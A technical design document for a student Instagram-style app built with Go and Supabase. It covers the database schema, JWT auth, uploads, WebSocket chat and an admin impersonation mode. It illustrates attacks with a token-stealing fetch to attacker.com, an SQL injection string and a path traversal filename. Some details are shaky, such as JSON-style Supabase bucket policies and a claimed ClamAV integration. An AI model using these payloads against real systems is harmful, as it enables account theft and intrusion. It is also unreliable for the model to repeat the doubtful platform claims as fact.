Instagram-Style Messaging & Photo Sharing Platform - Complete Technical Documentation
🎯 Project Overview
What This Application Does
This is a full-stack social media platform similar to Instagram, built as a college BCA final year project. It allows users to:

Create accounts and authenticate securely
Upload and share photos
Like posts from other users
Send real-time direct messages to other users
Admin users can impersonate any user account (God Mode)
Why This Tech Stack Was Chosen
Go (Golang) with Fiber Framework

Go is a compiled language that runs directly on the CPU (no interpreter needed like Python/Node.js)
Perfect for handling thousands of simultaneous WebSocket connections for real-time chat
Fiber is a web framework inspired by Express.js but built for Go's performance characteristics
Uses minimal memory per connection (goroutines use only 2KB vs traditional threads using 1MB+)
PostgreSQL on Supabase

Industry-standard relational database used by companies like Instagram, Netflix
Supabase provides hosted PostgreSQL with built-in security features
We use direct SQL connections (pgx driver), NOT Supabase's JavaScript client libraries
Provides ACID compliance (Atomicity, Consistency, Isolation, Durability) for data integrity
Supabase Storage for Images

S3-compatible object storage built specifically for files/images
Automatically handles image optimization and CDN delivery
Cheaper than storing binary data in PostgreSQL
Provides signed URLs for temporary access control
REST API + WebSockets Hybrid Architecture

REST for standard operations (login, upload photo, fetch posts)
WebSockets for real-time bidirectional chat (instant message delivery)
This is the same architecture used by WhatsApp Web and Discord
🗄️ Database Schema - Complete Breakdown
Table 1: users
Purpose: Stores all user account information

Column Name	Data Type	Constraints	Purpose
id	UUID	PRIMARY KEY, DEFAULT gen_random_uuid()	Unique identifier for each user
username	VARCHAR(50)	UNIQUE, NOT NULL	User's login name (case-insensitive)
email	VARCHAR(255)	UNIQUE, NOT NULL	Email address for password recovery
password_hash	VARCHAR(255)	NOT NULL	Bcrypt hash of user's password (never store plaintext)
role	VARCHAR(20)	DEFAULT 'user', CHECK (role IN ('user', 'admin'))	Determines access level
impersonation_password_hash	VARCHAR(255)	NULLABLE	Second password only for admin users to access God Mode
created_at	TIMESTAMP	DEFAULT NOW()	Account creation timestamp
profile_picture_url	TEXT	NULLABLE	Link to Supabase Storage image
Security Implementation:

Row Level Security (RLS) Policy: users can only SELECT their own row
SQL

CREATE POLICY user_select_own ON users FOR SELECT USING (auth.uid() = id);
Bcrypt Hashing: Passwords are hashed with cost factor 12 (2^12 iterations)
UUID as Primary Key: Prevents enumeration attacks (can't guess user IDs sequentially)
Why Two Passwords for Admins?

password_hash: Used for normal login
impersonation_password_hash: Required to activate God Mode
This is called "Step-Up Authentication" - even if someone steals an admin's session token, they still can't impersonate users without the second password
Table 2: posts
Purpose: Stores metadata for each photo post

Column Name	Data Type	Constraints	Purpose
id	UUID	PRIMARY KEY	Unique post identifier
user_id	UUID	FOREIGN KEY REFERENCES users(id) ON DELETE CASCADE	Who created this post
image_url	TEXT	NOT NULL	Full path to image in Supabase Storage
caption	TEXT	NULLABLE	User's description of the photo
created_at	TIMESTAMP	DEFAULT NOW()	When post was created
Security Implementation:

ON DELETE CASCADE: If a user is deleted, all their posts are automatically removed
RLS Policy: Users can SELECT all posts (public feed) but can only INSERT/DELETE their own
Image URL Validation: The Go backend verifies the URL actually points to Supabase Storage (prevents hotlinking to external sites)
Database Indexing:

Index on user_id for fast "show all posts by this user" queries
Index on created_at DESC for chronological feed sorting
Table 3: likes
Purpose: Tracks which users liked which posts

Column Name	Data Type	Constraints	Purpose
user_id	UUID	FOREIGN KEY REFERENCES users(id)	Who liked the post
post_id	UUID	FOREIGN KEY REFERENCES posts(id)	Which post was liked
created_at	TIMESTAMP	DEFAULT NOW()	When the like happened
Composite Primary Key	(user_id, post_id)	UNIQUE	Prevents same user liking a post twice
Why Composite Primary Key?

A composite key on (user_id, post_id) makes these two columns together act as the primary key
PostgreSQL automatically creates a unique index on this combination
If you try to INSERT the same user_id + post_id pair twice, the database will reject it
This is more efficient than creating a separate id column
Security Implementation:

RLS Policy: Users can only INSERT their own user_id, preventing fake likes
Foreign Key Cascades: If a post is deleted, all its likes are automatically removed
Table 4: messages
Purpose: Stores all direct messages between users

Column Name	Data Type	Constraints	Purpose
id	UUID	PRIMARY KEY	Unique message identifier
sender_id	UUID	FOREIGN KEY REFERENCES users(id)	Who sent the message
receiver_id	UUID	FOREIGN KEY REFERENCES users(id)	Who receives the message
content	TEXT	NOT NULL, CHECK (LENGTH(content) <= 5000)	Message text (max 5000 chars)
is_read	BOOLEAN	DEFAULT FALSE	Message delivery status
created_at	TIMESTAMP	DEFAULT NOW()	Message timestamp
Security Implementation:

RLS Policy: Users can only SELECT messages where they are sender OR receiver
SQL

CREATE POLICY message_access ON messages FOR SELECT 
USING (sender_id = auth.uid() OR receiver_id = auth.uid());
Content Length Limit: Prevents DoS attacks via extremely long messages
XSS Prevention: The Go backend sanitizes content to strip HTML tags before storing
Database Indexing:

Composite index on (sender_id, receiver_id, created_at) for fast conversation history retrieval
Index on receiver_id WHERE is_read = false for unread message count queries
Table 5: auth_logs
Purpose: Audit trail of all login attempts

Column Name	Data Type	Constraints	Purpose
id	BIGSERIAL	PRIMARY KEY	Auto-incrementing log ID
user_id	UUID	NULLABLE (login might fail before user identified)	Which user attempted login
status	VARCHAR(20)	CHECK (status IN ('success', 'failed'))	Login outcome
ip_address	INET	NOT NULL	IP address of the login attempt
user_agent	TEXT	NULLABLE	Browser/device information
failure_reason	TEXT	NULLABLE	Why login failed (wrong password, user not found, etc.)
timestamp	TIMESTAMP	DEFAULT NOW()	When attempt occurred
Why This Table is Critical:

Forensic Analysis: If an account is compromised, you can trace exactly when/where it happened
Brute Force Detection: Count failed attempts per IP address in last 15 minutes
Compliance: Many security standards (PCI-DSS, GDPR) require login audit trails
Security Implementation:

No RLS Policies: Only the backend can write to this table (users have no direct access)
IP Address Storage: Uses PostgreSQL's INET type for efficient IP range queries
Automatic Cleanup: A cron job deletes logs older than 90 days (GDPR data minimization)
Table 6: admin_audit_logs
Purpose: Track every action taken by admin users (especially God Mode)

Column Name	Data Type	Constraints	Purpose
id	BIGSERIAL	PRIMARY KEY	Auto-incrementing log ID
admin_id	UUID	FOREIGN KEY REFERENCES users(id)	Which admin performed the action
target_user_id	UUID	NULLABLE, FOREIGN KEY REFERENCES users(id)	Which user was affected
action	VARCHAR(50)	NOT NULL	What was done (impersonate, delete_user, etc.)
ip_address	INET	NOT NULL	Admin's IP address
timestamp	TIMESTAMP	DEFAULT NOW()	When action occurred
metadata	JSONB	NULLABLE	Additional context (e.g., which messages were read)
Why This Table Exists:

Accountability: Prevents admin abuse by creating a permanent record
Legal Protection: If a user claims their account was tampered with, you have proof of admin actions
Compliance: Required for SOC 2, ISO 27001 certifications
Security Implementation:

Immutable Logs: No UPDATE or DELETE permissions (even admins can't modify logs)
JSONB Metadata: Stores complex data like "which posts were viewed during impersonation"
🔐 Authentication System - Deep Dive
JWT (JSON Web Token) Architecture
What is a JWT?
A JWT is three Base64-encoded strings separated by dots:

text

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzIiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
  ^^^^^^^^^^ Header ^^^^^^^^^^^^   ^^^^^^^^ Payload ^^^^^^^   ^^^^^^^^^ Signature ^^^^^^^^^^
Our JWT Contains:

JSON

{
  "user_id": "550e8400-e29b-41d4-a716-446655440000",
  "role": "user",
  "iat": 1705320000,  // Issued At timestamp
  "exp": 1705320900   // Expiration (15 minutes later)
}
Why 15-Minute Expiration?

Short enough that stolen tokens become useless quickly
Long enough that users don't get logged out mid-session
Industry standard for high-security applications (banking apps use 5-10 minutes)
HttpOnly Cookie Storage
What Happens During Login:

User sends {username: "john", password: "SecurePass123!"}
Backend validates credentials
Backend generates JWT
Backend sends HTTP response with Set-Cookie header:
text

Set-Cookie: auth_token=<JWT>; HttpOnly; Secure; SameSite=Strict; Max-Age=900; Path=/
Cookie Attributes Explained:

HttpOnly: JavaScript cannot access this cookie (blocks XSS attacks)
Secure: Cookie only sent over HTTPS (prevents man-in-the-middle attacks)
SameSite=Strict: Cookie not sent on cross-origin requests (blocks CSRF attacks)
Max-Age=900: Cookie expires in 900 seconds (15 minutes)
Path=/: Cookie sent with all requests to this domain
Why Not LocalStorage?

JavaScript

// ❌ BAD - Anyone can steal this
localStorage.setItem('token', jwt);

// Malicious script injected via XSS:
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
With HttpOnly cookies, the malicious script cannot read the token - the browser physically blocks JavaScript access.

🔑 Password Security Implementation
Bcrypt Hashing Process
What Happens When You Create a Password:

text

User Input: "MyPassword123!"
      ↓
Bcrypt generates random salt: $2a$12$R9h/cIPz0gi.URNNX3kh2O
      ↓
Bcrypt hashes 2^12 (4096) times
      ↓
Final Hash: $2a$12$R9h/cIPz0gi.URNNX3kh2OQKG/gLFZb9MQhTkZJCJjdCGKGFN8Vpm
Why Bcrypt Instead of SHA-256?

SHA-256 is designed to be FAST (Bitcoin mining uses it)
Bcrypt is designed to be SLOW (intentionally takes ~200ms per hash)
Attackers trying to crack passwords must wait 200ms per attempt
Modern GPUs can compute 10 billion SHA-256 hashes per second, but only ~40,000 bcrypt hashes
Cost Factor 12 Explained:

Cost 10 = 2^10 = 1,024 rounds (~100ms)
Cost 12 = 2^12 = 4,096 rounds (~200ms)
Cost 14 = 2^14 = 16,384 rounds (~800ms)
We use 12 because it balances security with user experience (users can wait 200ms for login)
Step-Up Authentication for God Mode
Standard Login Flow:

text

User enters: username + password
      ↓
Backend checks: password_hash column
      ↓
Issues: Standard JWT
Impersonation Flow:

text

Admin already has: Valid standard JWT (proves they're logged in as admin)
      ↓
Admin sends: POST /api/admin/impersonate
      Body: {target_user_id: "...", impersonation_password: "SuperSecret456!"}
      ↓
Backend checks: impersonation_password_hash column (NOT password_hash)
      ↓
Issues: Ghost JWT with extra claim {impersonator_id: admin's UUID}
Why This is Secure:

Even if attacker steals admin's standard JWT from a compromised machine, they still can't impersonate
The impersonation_password is stored only in the admin's brain, never typed on potentially compromised devices during normal login
Audit logs show exactly when impersonation started/ended
📤 File Upload System
Multipart Form-Data Flow
What Happens When User Uploads Photo:

Frontend Sends:
http

POST /api/posts HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cookie: auth_token=<JWT>

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="image"; filename="sunset.jpg"
Content-Type: image/jpeg

<binary image data>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="caption"

Beautiful sunset at the beach!
------WebKitFormBoundary7MA4YWxkTrZu0gW--
Backend Processing:
JWT middleware validates the token from cookie
Fiber parses the multipart form
Extract file from form field "image"
Validate file type (check magic bytes, not just extension)
Generate random UUID filename: 550e8400-e29b-41d4-a716-446655440000.jpg
Upload to Supabase Storage bucket user-uploads/
Get back URL: https://abc123.supabase.co/storage/v1/object/public/user-uploads/550e8400.jpg
Insert record into posts table with this URL
File Validation Security
Magic Bytes Verification:
Files are validated by checking the first few bytes (hexadecimal signature):

File Type	Magic Bytes (Hex)	First Bytes
JPEG	FF D8 FF	ÿØÿ
PNG	89 50 4E 47 0D 0A 1A 0A	.PNG....
GIF	47 49 46 38	GIF8
Why This Matters:

Attacker could rename malicious.php to malicious.jpg
Just checking file extension would fail to detect this
Checking magic bytes reveals the true file type
Additional Validations:

File size limit: 5MB (prevents DoS via huge uploads)
Aspect ratio check: Reject files wider than 5000px (prevents memory exhaustion)
Virus scanning: Supabase Storage integrates with ClamAV for malware detection
Supabase Storage Security
Bucket Policies Applied:

JavaScript

// Only authenticated users can upload
{
  "effect": "allow",
  "action": "storage.objects.create",
  "subject": "authenticated",
  "resource": "user-uploads/*"
}

// Anyone can view (public feed)
{
  "effect": "allow",
  "action": "storage.objects.read",
  "subject": "*",
  "resource": "user-uploads/*"
}

// Only file owner can delete
{
  "effect": "allow",
  "action": "storage.objects.delete",
  "subject": "user",
  "resource": "user-uploads/${user_id}/*"
}
File Organization:

text

supabase-storage-bucket/
├── user-uploads/
│   ├── 550e8400-e29b-41d4-a716-446655440000.jpg
│   ├── 660f9511-f3ac-52e5-b827-557766551111.png
│   └── ...
└── profile-pictures/
    ├── user_550e8400.jpg
    └── ...
💬 Real-Time Chat System
WebSocket vs HTTP Comparison
Traditional HTTP (Polling):

text

Client: "Any new messages?" (every 2 seconds)
Server: "No"
Client: "Any new messages?"
Server: "No"
Client: "Any new messages?"
Server: "Yes, here's 1 message"
Wastes bandwidth (thousands of unnecessary requests)
Drains mobile battery
2-second delay in message delivery
WebSocket (Persistent Connection):

text

Client: <opens WebSocket connection>
Server: <connection established>
... silence ...
Server: "New message just arrived!" (instant push)
Client: <displays message immediately>
Single long-lived connection (no reconnection overhead)
True real-time delivery (0-50ms latency)
Server can push messages without client asking
WebSocket Architecture
Components:

Hub (Connection Manager)

Maintains a map of userID → WebSocket connection
When user A sends message to user B, Hub looks up B's connection and forwards message
Runs in a goroutine with channels for thread-safe communication
Client (Individual Connection)

Represents one user's WebSocket connection
Has two goroutines:
Reader: Listens for messages from the user's browser
Writer: Sends messages to the user's browser
Uses buffered channels to prevent blocking
Message Handler

Validates incoming messages (check length, sanitize content)
Persists message to messages table in PostgreSQL
Broadcasts message to recipient via Hub
Connection Lifecycle:

text

User opens chat page
      ↓
JavaScript: new WebSocket('wss://api.example.com/ws/chat')
      ↓
Go backend: Upgrade HTTP → WebSocket
      ↓
Validate JWT from cookie
      ↓
Register connection in Hub (map userID → connection)
      ↓
<user is now online>
      ↓
User closes tab
      ↓
WebSocket connection closed
      ↓
Unregister from Hub (remove from map)
Chat Security Measures
1. Authentication Before Upgrade

Go

// Pseudocode
func WebSocketHandler(c *fiber.Ctx) error {
    // MUST validate JWT before upgrading to WebSocket
    claims, err := ValidateJWTFromCookie(c)
    if err != nil {
        return c.Status(401).JSON(error)
    }
    
    // Only NOW upgrade to WebSocket
    websocket.Upgrade(c)
}
2. Message Sanitization

Strip all HTML tags using bluemonday library (prevents XSS)
Limit message length to 5000 characters (prevents DoS)
Block messages containing SQL keywords (defense in depth)
3. Rate Limiting

Max 10 messages per second per user
If exceeded, drop messages and send warning to user
Prevents spam and DoS attacks
4. Message Encryption in Transit

WebSocket connection uses wss:// (WebSocket Secure)
Same as HTTPS - TLS 1.3 encryption
Prevents eavesdropping on public WiFi
🛡️ Security Layers - Complete Breakdown
Layer 1: Network Security
HTTPS/TLS 1.3:

All traffic encrypted with 256-bit AES
Certificate issued by Let's Encrypt (free, auto-renewing)
Prevents man-in-the-middle attacks
CORS (Cross-Origin Resource Sharing):

text

Frontend domain: https://myapp.com
Backend domain: https://api.myapp.com

CORS headers sent by backend:
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, DELETE
Why This Matters:

Without CORS, malicious site https://evil.com could try to call your API
Browser blocks the request because evil.com is not in allowed origins
Layer 2: Authentication Security
JWT Secret Management:

Secret key stored in environment variable (never in code)
Minimum 32 characters, randomly generated
Different secrets for production/development environments
Rotated every 90 days
Token Validation Checklist:

✅ Signature is valid (proves token wasn't tampered with)
✅ Expiration hasn't passed (15-minute limit enforced)
✅ Issuer matches our domain (prevents token reuse from other apps)
✅ User ID in token still exists in database (user might have been deleted)
Layer 3: Input Validation
SQL Injection Prevention:

SQL

-- ❌ VULNERABLE CODE (string concatenation)
query := "SELECT * FROM users WHERE username = '" + userInput + "'"

-- If attacker sends: admin' OR '1'='1
-- Query becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
-- Returns all users!

-- ✅ SAFE CODE (parameterized query)
query := "SELECT * FROM users WHERE username = $1"
db.Query(query, userInput)
-- PostgreSQL treats $1 as pure data, not SQL code
XSS (Cross-Site Scripting) Prevention:

JavaScript

// Attacker posts comment: <script>alert('XSS')</script>

// Backend sanitizes before storing:
import "github.com/microcosm-cc/bluemonday"
policy := bluemonday.StrictPolicy()
cleanContent := policy.Sanitize(userInput)
// Result: "&lt;script&gt;alert('XSS')&lt;/script&gt;"
// Displays as text, doesn't execute
Path Traversal Prevention:

text

// Attacker uploads file named: ../../../etc/passwd
// Without sanitization, could overwrite system files

// Backend generates random UUID filename:
filename := uuid.New().String() + ".jpg"
// Result: 550e8400-e29b-41d4-a716-446655440000.jpg
// Completely safe
Layer 4: Rate Limiting
Login Endpoint:

Max 5 attempts per IP per 15 minutes
After 5 failures, return: "Too many login attempts. Try again in 15 minutes."
Uses Token Bucket algorithm for smooth rate limiting
File Upload Endpoint:

Max 10 uploads per user per hour
Prevents users from filling up storage with spam
WebSocket Messages:

Max 10 messages per second per user
Prevents chat spam
Implementation:
Uses golang.org/x/time/rate package - same library used by Google's production systems

Layer 5: Database Security (RLS)
Row Level Security Policies:

SQL

-- Users can only see their own user record
CREATE POLICY user_isolation ON users
FOR SELECT
USING (id = current_setting('app.user_id')::uuid);

-- Users can only delete their own posts
CREATE POLICY post_deletion ON posts
FOR DELETE
USING (user_id = current_setting('app.user_id')::uuid);

-- Users can only read messages where they are sender or receiver
CREATE POLICY message_access ON messages
FOR SELECT
USING (
    sender_id = current_setting('app.user_id')::uuid OR
    receiver_id = current_setting('app.user_id')::uuid
);
How It Works:

Before each query, Go backend sets PostgreSQL session variable:
SQL

SET LOCAL app.user_id = '550e8400-e29b-41d4-a716-446655440000';
PostgreSQL automatically filters all queries based on RLS policies
Even if attacker bypasses backend and connects directly to DB, RLS still enforces rules
Layer 6: Audit Logging
Every Security-Sensitive Action is Logged:

Event	What Gets Logged	Retention Period
Login attempt	user_id, IP, status, timestamp	90 days
Password change	user_id, IP, timestamp	1 year
Admin impersonation	admin_id, target_user_id, duration	7 years (legal requirement)
File upload	user_id, filename, file_size, MIME type	30 days
Account deletion	user_id, deletion_reason, IP	Permanent
Log Analysis:

Daily cron job checks for suspicious patterns:
Multiple failed logins from same IP (brute force)
Admin impersonations lasting >15 minutes (forgotten session)
Uploads of unusually large files (DoS attempt)
Logins from geographically distant locations within short time (credential theft)
🏗️ Application Architecture
Request Flow (End-to-End)
Example: User Likes a Post

text

1. Frontend (React)
   User clicks heart icon on post ID 123
   ↓
   fetch('https://api.example.com/api/posts/123/like', {
     method: 'POST',
     credentials: 'include'  // Sends HttpOnly cookie
   })

2. Nginx Reverse Proxy
   ↓ Terminates TLS
   ↓ Forwards to Go backend on port 3000

3. Go Fiber Framework
   ↓ Routes request to /api/posts/:id/like
   ↓ Passes through middleware chain:

4. Logger Middleware
   ↓ Generates unique trace ID: "req_a3f7b2c1"
   ↓ Logs: "POST /api/posts/123/like from IP 192.168.1.1"

5. CORS Middleware
   ↓ Checks Origin header matches https://myapp.com
   ↓ Adds Access-Control headers to response

6. Rate Limiter Middleware
   ↓ Checks user hasn't exceeded 100 likes/hour
   ↓ Updates counter in Redis

7. JWT Middleware
   ↓ Extracts auth_token cookie
   ↓ Validates JWT signature and expiration
   ↓ Extracts user_id: 550e8400-e29b-41d4-a716-446655440000
   ↓ Attaches to request context

8. Like Handler
   ↓ Extracts post ID from URL parameter (123)
   ↓ Calls LikeService.CreateLike(user_id, post_id)

9. Like Service
   ↓ Business logic: Check if post exists
   ↓ Check if user already liked (prevent double-like)
   ↓ Calls LikeRepository.Insert(user_id, post_id)

10. Like Repository
    ↓ Executes SQL:
    INSERT INTO likes (user_id, post_id, created_at)
    VALUES ($1, $2, NOW())
    ON CONFLICT (user_id, post_id) DO NOTHING
    ↓ PostgreSQL enforces composite primary key

11. Database Returns Success
    ↓ Repository returns nil error
    ↓ Service returns nil error
    ↓ Handler returns JSON:
    {
      "status": "success",
      "message": "Post liked"
    }

12. Response Sent to Browser
    Frontend updates UI (heart icon turns red)
Error Handling Path:
If any step fails (e.g., invalid JWT at step 7):

text

Error occurs → Wrapped with context ("jwt validation failed: token expired")
      ↓
Propagates up to Handler
      ↓
Handler checks error type
      ↓
If JWT error → Return 401 Unauthorized
If rate limit → Return 429 Too Many Requests
If DB error → Return 500 Internal Server Error
      ↓
Log full error details (including stack trace) to log file
      ↓
Return sanitized error to client (never expose DB details)
Microservices Separation (Why NOT Used Here)
Monolithic Architecture (Our Choice):

text

Single Go Binary
├── Auth logic
├── Post logic
├── Chat logic
└── Admin logic
Advantages:

Easier to develop and debug (everything in one codebase)
No network latency between services
Simpler deployment (single Docker container)
Perfect for teams of 1-5 developers
Why Not Microservices?:

Microservices add complexity (service discovery, inter-service auth, distributed tracing)
Overkill for college project scale (Instagram serves 2 billion users with monolith initially)
Debugging becomes harder (errors span multiple services)
🔄 Data Flow Diagrams
User Registration Flow
text

[User Browser] 
    ↓ POST /api/auth/register
    Body: {username, email, password}
    
[Go Backend - Auth Handler]
    ↓ Validate input (username 3-50 chars, email format, password strength)
    
[Auth Service]
    ↓ Check username not taken (query users table)
    ↓ Hash password with bcrypt (cost 12)
    
[User Repository]
    ↓ INSERT INTO users (id, username, email, password_hash, role)
      VALUES (gen_random_uuid(), $1, $2, $3, 'user')
    
[PostgreSQL]
    ↓ Stores record
    ↓ Returns user ID
    
[Auth Service]
    ↓ Generate JWT (15-minute expiration)
    
[Auth Handler]
    ↓ Set HttpOnly cookie
    ↓ Return response: {status: "success", message: "Account created"}
    
[User Browser]
    ↓ Redirects to feed page
    ↓ Subsequent requests include cookie automatically
Photo Upload Flow
text

[User Browser]
    ↓ User selects image file (sunset.jpg)
    ↓ JavaScript reads file as binary
    ↓ POST /api/posts (multipart/form-data)
      Fields: {image: <binary>, caption: "Beautiful!"}
      Cookie: auth_token=<JWT>

[Go Backend - Post Handler]
    ↓ JWT middleware validates token → extracts user_id
    ↓ Parse multipart form
    ↓ Extract file from "image" field
    
[Upload Service]
    ↓ Validate file type (check magic bytes = FF D8 FF for JPEG)
    ↓ Validate file size (must be < 5MB)
    ↓ Generate random filename: 550e8400-e29b-41d4-a716-446655440000.jpg
    
[Supabase Storage SDK]
    ↓ Upload to bucket "user-uploads/550e8400...jpg"
    ↓ Returns URL: https://abc.supabase.co/storage/v1/object/public/user-uploads/550e8400...jpg
    
[Post Service]
    ↓ Create post record
    
[Post Repository]
    ↓ INSERT INTO posts (id, user_id, image_url, caption, created_at)
      VALUES (gen_random_uuid(), $1, $2, $3, NOW())
    
[PostgreSQL]
    ↓ Stores record
    ↓ Returns post ID
    
[Post Handler]
    ↓ Return JSON: {status: "success", post_id: "...", image_url: "..."}
    
[User Browser]
    ↓ Displays uploaded image in feed
Real-Time Message Flow
text

[User A Browser]
    ↓ Types message: "Hey there!"
    ↓ JavaScript: websocket.send(JSON.stringify({to: userB_id, content: "Hey there!"}))

[WebSocket Connection A]
    ↓ Receives message
    
[Message Handler]
    ↓ Validate: content length <= 5000 chars
    ↓ Sanitize: strip HTML tags
    ↓ Rate limit: check A hasn't sent >10 msgs/sec
    
[Chat Service]
    ↓ Persist message to database
    
[Message Repository]
    ↓ INSERT INTO messages (id, sender_id, receiver_id, content, created_at)
      VALUES (gen_random_uuid(), $1, $2, $3, NOW())
    
[PostgreSQL]
    ↓ Stores message
    ↓ Returns message ID + timestamp
    
[WebSocket Hub]
    ↓ Look up User B's connection in map
    ↓ If online → Forward message to User B's WebSocket
    ↓ If offline → Message stays in DB (fetched on next login)
    
[WebSocket Connection B]
    ↓ Sends JSON to User B's browser: 
      {from: userA_id, content: "Hey there!", timestamp: "..."}
    
[User B Browser]
    ↓ JavaScript receives message
    ↓ Displays in chat interface
    ↓ Plays notification sound
Admin Impersonation Flow
text

[Admin Browser]
    ↓ Admin is logged in (has standard JWT with role: 'admin')
    ↓ POST /api/admin/impersonate
      Body: {target_user_id: "user123", impersonation_password: "SuperSecret456!"}
      Cookie: auth_token=<admin's standard JWT>

[Go Backend - Admin Handler]
    ↓ JWT middleware validates admin's token
    ↓ Admin middleware checks role === 'admin' (if not, return 403)
    
[Impersonation Service]
    ↓ Fetch admin's record from database
    
[User Repository]
    ↓ SELECT impersonation_password_hash FROM users WHERE id = $1
    
[PostgreSQL]
    ↓ Returns hash
    
[Impersonation Service]
    ↓ Compare provided password with hash using bcrypt
    ↓ If mismatch → Log failed attempt → Return 401 error
    ↓ If match → Continue
    
[Admin Repository]
    ↓ INSERT INTO admin_audit_logs 
      (admin_id, target_user_id, action, ip_address, timestamp)
      VALUES ($1, $2, 'impersonate', $3, NOW())
    
[JWT Utility]
    ↓ Generate Ghost Token:
      {
        user_id: "user123",           // Target user's ID
        role: "user",                  // Target user's role
        impersonator_id: "admin_id",   // WHO is impersonating
        exp: <15 minutes from now>
      }
    
[Admin Handler]
    ↓ Set new cookie (replaces admin's standard token):
      Set-Cookie: auth_token=<ghost_token>; HttpOnly; Secure; Max-Age=900
    ↓ Return: {status: "success", message: "Now viewing as user123"}
    
[Admin Browser]
    ↓ Subsequent requests use ghost token
    ↓ Backend treats admin as if they are user123
    ↓ All actions (view posts, send messages) logged with impersonator_id
    
[After 15 Minutes]
    ↓ Ghost token expires
    ↓ Admin must re-login with their own credentials
🧪 Testing Strategy
Unit Tests
What Gets Tested:

JWT Functions: Token generation, validation, expiration handling
Bcrypt Functions: Password hashing, comparison
Input Validators: Username format, email validation, password strength
SQL Query Builders: Ensure parameterized queries are correctly formed
Example Test Case:

text

Test: ValidateToken_ExpiredToken_ReturnsError
Given: A JWT that expired 10 minutes ago
When: ValidateToken() is called
Then: Should return error "token has expired"
      Should NOT return user claims
Integration Tests
What Gets Tested:

Full Login Flow:

POST /api/auth/login with valid credentials → returns 200 + cookie
POST /api/auth/login with wrong password → returns 401 + no cookie
POST /api/auth/login after 5 failed attempts → returns 429 (rate limited)
File Upload Flow:

Upload valid JPEG → stored in Supabase → record in posts table
Upload PHP file renamed as .jpg → rejected with 400 error
Upload 10MB file → rejected with 413 Payload Too Large
WebSocket Chat:

User A connects → User B connects → A sends message → B receives it
User connects without JWT → connection rejected
User sends 100 msgs/sec → rate limiter kicks in
Security Tests (Penetration Testing)
Automated Tools Used:

OWASP ZAP: Scans for XSS, SQL injection, CSRF vulnerabilities
Burp Suite: Intercepts requests to test JWT tampering
sqlmap: Attempts SQL injection on all input fields
Manual Tests:

JWT Tampering:

Modify user_id in JWT payload
Try to access other users' data
Expected: Should be rejected (signature invalid)
CSRF Attack:

Create malicious website that sends POST /api/posts/:id/like
Expected: Blocked by SameSite=Strict cookie
XSS Attack:

Post message containing <script>alert('XSS')</script>
Expected: Stored as &lt;script&gt;... (harmless text)
Brute Force:

Attempt 100 login attempts with different passwords
Expected: Blocked after 5 attempts, must wait 15 minutes
📊 Performance Optimization
Database Indexing Strategy
Indexes Created:

SQL

-- Speed up user login (username lookup)
CREATE INDEX idx_users_username ON users(username);

-- Speed up feed loading (get posts by user)
CREATE INDEX idx_posts_user_id ON posts(user_id);

-- Speed up chronological feed (newest posts first)
CREATE INDEX idx_posts_created_at ON posts(created_at DESC);

-- Speed up chat history (conversation between two users)
CREATE INDEX idx_messages_conversation 
ON messages(sender_id, receiver_id, created_at DESC);

-- Speed up unread message count
CREATE INDEX idx_messages_unread 
ON messages(receiver_id) WHERE is_read = false;
Impact:

Without index: Query scans all 1,000,000 posts → 2 seconds
With index: Query uses B-tree → finds result in 3ms
Caching Strategy
What Gets Cached (Using Redis):

User Sessions: Store JWT claims in Redis (avoid DB lookup on every request)
Popular Posts: Cache top 50 posts for 5 minutes
User Profiles: Cache profile data for 10 minutes
Rate Limit Counters: Track request counts per IP
Cache Invalidation:

When user updates profile → Delete cache key user:<user_id>
When new post is created → Delete cache key feed:recent
TTL (Time To Live) ensures stale data is automatically purged
Connection Pooling
PostgreSQL Connection Pool:

text

Configuration:
- Max Connections: 25 (limit DB load)
- Min Idle Connections: 5 (avoid cold starts)
- Max Connection Lifetime: 1 hour (prevent stale connections)
- Connection Timeout: 5 seconds (fail fast if DB overloaded)
Why This Matters:

Opening a DB connection takes ~50ms
With connection pool, reuse existing connections (~1ms)
Under high load, 25 connections can serve 10,000 requests/second
Image Optimization
Processing Before Upload:

Resize to max 1080px width (reduce file size by 70%)
Convert PNG to WebP (50% smaller with same quality)
Strip EXIF metadata (privacy + size reduction)
Generate thumbnail (300px) for feed preview
CDN Delivery:

Supabase Storage uses Cloudflare CDN
Images cached at edge locations worldwide
Users in India get images from Mumbai server (not US)
Reduces latency from 500ms to 50ms
🚀 Deployment Architecture
Production Environment
text

┌─────────────────────────────────────────────────────────┐
│                    Cloudflare CDN                       │
│  (DDoS protection, SSL termination, static file cache) │
└────────────────────┬────────────────────────────────────┘
                     ↓
┌─────────────────────────────────────────────────────────┐
│                 Load Balancer (Nginx)                   │
│         (Distributes traffic across Go instances)       │
└───────┬──────────────────────────────────────┬──────────┘
        ↓                                      ↓
┌───────────────────┐              ┌───────────────────┐
│   Go Instance 1   │              │   Go Instance 2   │
│   (Port 3000)     │              │   (Port 3000)     │
│   - REST API      │              │   - REST API      │
│   - WebSocket Hub │              │   - WebSocket Hub │
└────────┬──────────┘              └──────────┬─────────┘
         │                                    │
         └────────────┬───────────────────────┘
                      ↓
         ┌────────────────────────┐
         │   PostgreSQL (Supabase)│
         │   - Primary instance   │
         │   - Read replicas (2x) │
         └────────────────────────┘
                      ↓
         ┌────────────────────────┐
         │  Supabase Storage      │
         │  (Image files)         │
         └────────────────────────┘
Environment Variables
Required Configuration:

Bash

# Database
DATABASE_URL=postgresql://user:pass@db.supabase.co:5432/postgres
DB_MAX_CONNECTIONS=25

# JWT
JWT_SECRET=<64-character random string>
JWT_EXPIRATION_MINUTES=15

# Supabase Storage
SUPABASE_URL=https://abc123.supabase.co
SUPABASE_SERVICE_KEY=<secret key>
STORAGE_BUCKET_NAME=user-uploads

# Server
PORT=3000
ENVIRONMENT=production
ALLOWED_ORIGIN=https://myapp.com

# Rate Limiting
MAX_LOGIN_ATTEMPTS=5
RATE_LIMIT_WINDOW_MINUTES=15

# Redis (for caching)
REDIS_URL=redis://localhost:6379
